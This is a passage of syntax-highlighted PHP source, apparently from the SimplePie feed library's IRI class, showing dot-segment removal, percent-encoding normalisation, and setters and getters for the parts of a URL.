of "/./" or "/.", where "." is a complete path segment, then replace that prefix with "/" in the input buffer; otherwise,</span></span><br><span class="line"><span class="keyword">elseif</span> (strpos($input, <span class="string">'/./'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = substr_replace($input, <span class="string">'/'</span>, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($input === <span class="string">'/.'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = <span class="string">'/'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// C: if the input buffer begins with a prefix of "/../" or "/..", where ".." is a complete path segment, then replace that prefix with "/" in the input buffer and remove the last segment and its preceding "/" (if any) from the output buffer; otherwise,</span></span><br><span class="line"><span class="keyword">elseif</span> (strpos($input, <span class="string">'/../'</span>) === <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = substr_replace($input, <span class="string">'/'</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">$output = substr_replace($output, <span class="string">''</span>, strrpos($output, <span class="string">'/'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($input === <span class="string">'/..'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = <span class="string">'/'</span>;</span><br><span class="line">$output = substr_replace($output, <span class="string">''</span>, strrpos($output, <span class="string">'/'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// D: if the input buffer consists only of "." or "..", then remove that from the input buffer; otherwise,</span></span><br><span class="line"><span class="keyword">elseif</span> ($input === <span class="string">'.'</span> || $input === <span class="string">'..'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$input = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// E: move the first path segment in the input buffer to the end of the output buffer, including the initial "/" character (if any) and any subsequent characters up to, but not including, the next "/" character or the end of the input buffer</span></span><br><span class="line"><span class="keyword">elseif</span> (($pos = strpos($input, <span class="string">'/'</span>, <span class="number">1</span>)) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$output .= substr($input, <span class="number">0</span>, $pos);</span><br><span class="line">$input = substr_replace($input, <span class="string">''</span>, <span class="number">0</span>, $pos);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$output .= $input;</span><br><span class="line">$input = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $output . $input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Replace invalid character with percent encoding</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> private</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $string Input string</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $valid_chars Valid characters</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int $case Normalise case</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_invalid_with_pct_encoding</span><span class="params">($string, $valid_chars, $case = SIMPLEPIE_SAME_CASE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Normalise case</span></span><br><span class="line"><span class="keyword">if</span> ($case &amp; SIMPLEPIE_LOWERCASE)</span><br><span class="line">&#123;</span><br><span class="line">$string = strtolower($string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($case &amp; SIMPLEPIE_UPPERCASE)</span><br><span class="line">&#123;</span><br><span class="line">$string = strtoupper($string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Store position and string length (to avoid constantly recalculating this)</span></span><br><span class="line">$position = <span class="number">0</span>;</span><br><span class="line">$strlen = strlen($string);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Loop as long as we have invalid characters, advancing the position to the next invalid character</span></span><br><span class="line"><span class="keyword">while</span> (($position += strspn($string, $valid_chars, $position)) &lt; $strlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// If we have a % character</span></span><br><span class="line"><span class="keyword">if</span> ($string[$position] === <span class="string">'%'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// If we have a pct-encoded section</span></span><br><span class="line"><span class="keyword">if</span> ($position + <span class="number">2</span> &lt; $strlen &amp;&amp; strspn($string, <span class="string">'0123456789ABCDEFabcdef'</span>, $position + <span class="number">1</span>, <span class="number">2</span>) === <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Get the the represented character</span></span><br><span class="line">$chr = chr(hexdec(substr($string, $position + <span class="number">1</span>, <span class="number">2</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">// If the character is valid, replace the pct-encoded with the actual character while normalising case</span></span><br><span class="line"><span class="keyword">if</span> (strpos($valid_chars, $chr) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ($case &amp; SIMPLEPIE_LOWERCASE)</span><br><span class="line">&#123;</span><br><span class="line">$chr = strtolower($chr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($case &amp; SIMPLEPIE_UPPERCASE)</span><br><span class="line">&#123;</span><br><span class="line">$chr = strtoupper($chr);</span><br><span class="line">&#125;</span><br><span class="line">$string = substr_replace($string, $chr, $position, <span class="number">3</span>);</span><br><span class="line">$strlen -= <span class="number">2</span>;</span><br><span class="line">$position++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Otherwise just normalise the pct-encoded to uppercase</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$string = substr_replace($string, strtoupper(substr($string, $position + <span class="number">1</span>, <span class="number">2</span>)), $position + <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">$position += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If we don't have a pct-encoded section, just replace the % with its own esccaped form</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$string = substr_replace($string, <span class="string">'%25'</span>, $position, <span class="number">1</span>);</span><br><span class="line">$strlen += <span class="number">2</span>;</span><br><span class="line">$position += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// If we have an invalid character, change into its pct-encoded form</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$replacement = sprintf(<span class="string">"%%%02X"</span>, ord($string[$position]));</span><br><span class="line">$string = str_replace($string[$position], $replacement, $string);</span><br><span class="line">$strlen = strlen($string);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Check if the object represents a valid IRI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> array_sum(<span class="keyword">$this</span>-&gt;valid) === count(<span class="keyword">$this</span>-&gt;valid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the scheme. Returns true on success, false on failure (if there are</span></span><br><span class="line"><span class="comment"> * any invalid characters).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $scheme</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_scheme</span><span class="params">($scheme)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($scheme === <span class="keyword">null</span> || $scheme === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;scheme = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$len = strlen($scheme);</span><br><span class="line"><span class="keyword">switch</span> (<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> $len &gt; <span class="number">1</span>:</span><br><span class="line"><span class="keyword">if</span> (!strspn($scheme, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-.'</span>, <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;scheme = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> $len &gt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> (!strspn($scheme, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span>, <span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;scheme = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;scheme = strtolower($scheme);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the authority. Returns true on success, false on failure (if there are</span></span><br><span class="line"><span class="comment"> * any invalid characters).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $authority</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_authority</span><span class="params">($authority)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (($userinfo_end = strrpos($authority, <span class="string">'@'</span>)) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$userinfo = substr($authority, <span class="number">0</span>, $userinfo_end);</span><br><span class="line">$authority = substr($authority, $userinfo_end + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$userinfo = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (($port_start = strpos($authority, <span class="string">':'</span>)) !== <span class="keyword">false</span>)</span><br><span class="line">&#123;</span><br><span class="line">$port = substr($authority, $port_start + <span class="number">1</span>);</span><br><span class="line">$authority = substr($authority, <span class="number">0</span>, $port_start);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$port = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;set_userinfo($userinfo) &amp;&amp; <span class="keyword">$this</span>-&gt;set_host($authority) &amp;&amp; <span class="keyword">$this</span>-&gt;set_port($port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the userinfo.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $userinfo</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_userinfo</span><span class="params">($userinfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($userinfo === <span class="keyword">null</span> || $userinfo === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;userinfo = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;userinfo = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($userinfo, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the host. Returns true on success, false on failure (if there are</span></span><br><span class="line"><span class="comment"> * any invalid characters).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $host</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_host</span><span class="params">($host)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($host === <span class="keyword">null</span> || $host === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($host[<span class="number">0</span>] === <span class="string">'['</span> &amp;&amp; substr($host, <span class="number">-1</span>) === <span class="string">']'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Net_IPv6::checkIPv6(substr($host, <span class="number">1</span>, <span class="number">-1</span>)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = $host;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;host = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($host, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;='</span>, SIMPLEPIE_LOWERCASE);</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the port. Returns true on success, false on failure (if there are</span></span><br><span class="line"><span class="comment"> * any invalid characters).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $port</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_port</span><span class="params">($port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($port === <span class="keyword">null</span> || $port === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;port = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (strspn($port, <span class="string">'0123456789'</span>) === strlen($port))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;port = (int) $port;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;port = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $path</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_path</span><span class="params">($path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($path === <span class="keyword">null</span> || $path === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;path = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (substr($path, <span class="number">0</span>, <span class="number">2</span>) === <span class="string">'//'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;userinfo === <span class="keyword">null</span> &amp;&amp; <span class="keyword">$this</span>-&gt;host === <span class="keyword">null</span> &amp;&amp; <span class="keyword">$this</span>-&gt;port === <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;path = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;path = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($path, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=@/'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;scheme !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;path = <span class="keyword">$this</span>-&gt;remove_dot_segments(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the query.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $query</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_query</span><span class="params">($query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($query === <span class="keyword">null</span> || $query === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;query = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;query = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($query, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:@/?'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Set the fragment.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $fragment</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_fragment</span><span class="params">($fragment)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($fragment === <span class="keyword">null</span> || $fragment === <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fragment = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;fragment = <span class="keyword">$this</span>-&gt;replace_invalid_with_pct_encoding($fragment, <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:@/?'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;valid[<span class="keyword">__FUNCTION__</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the complete IRI</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iri</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$iri = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;scheme !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="keyword">$this</span>-&gt;scheme . <span class="string">':'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (($authority = <span class="keyword">$this</span>-&gt;get_authority()) !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="string">'//'</span> . $authority;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;path !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="keyword">$this</span>-&gt;path;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;query !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="string">'?'</span> . <span class="keyword">$this</span>-&gt;query;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;fragment !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$iri .= <span class="string">'#'</span> . <span class="keyword">$this</span>-&gt;fragment;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($iri !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> $iri;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the scheme</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_scheme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;scheme;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the complete authority</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_authority</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$authority = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userinfo !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$authority .= <span class="keyword">$this</span>-&gt;userinfo . <span class="string">'@'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;host !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$authority .= <span class="keyword">$this</span>-&gt;host;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;port !== <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">$authority .= <span class="string">':'</span> . <span class="keyword">$this</span>-&gt;port;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($authority !== <span class="string">''</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> $authority;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the user information</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_userinfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;userinfo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Get the host</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 